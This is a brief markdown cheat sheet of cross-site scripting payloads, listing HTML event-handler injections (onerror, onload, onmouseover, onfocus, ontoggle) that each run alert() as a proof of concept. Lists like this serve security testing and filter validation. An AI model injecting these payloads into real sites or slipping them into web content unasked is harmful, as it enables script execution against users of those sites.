# XSS Payloads

## onerror
```html
<img src=x onerror="alert('onerror')">
```
```html
<video src=x onerror="alert('onerror')">
```
```html
<audio src=x onerror="alert('onerror')">
```

## onload
```html
<svg onload="alert('onload')">
```
```html
<body onload="alert('onload')">
```
```html
<iframe onload="alert('onload')">
```

## interactive
```html
<div onmouseover="alert('hover')">hover me</div>
```
```html
<input onfocus="alert('focus')" autofocus>
```
```html
<details open ontoggle="alert('toggle')">
```

